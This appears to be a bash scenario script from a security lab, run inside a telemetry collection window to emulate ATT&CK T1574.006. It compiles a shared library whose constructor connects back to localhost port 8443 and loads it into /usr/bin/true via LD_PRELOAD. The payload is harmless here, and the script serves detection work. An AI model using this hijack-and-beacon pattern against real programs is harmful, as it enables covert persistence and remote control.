#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# T1574.006：.so 写入 + LD_PRELOAD 劫持合法程序（构造函数回连）
cc -O2 -Wall -shared -fPIC -o libpreload.so -x c - <<'EC'
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
__attribute__((constructor)) static void beacon(void) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0}; a.sin_family = AF_INET; a.sin_port = htons(8443);
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    if (connect(fd, (struct sockaddr *)&a, sizeof(a)) == 0) close(fd);
}
EC
"$HERE/common/with_listener.sh" 8443 env LD_PRELOAD="$PWD/libpreload.so" /usr/bin/true
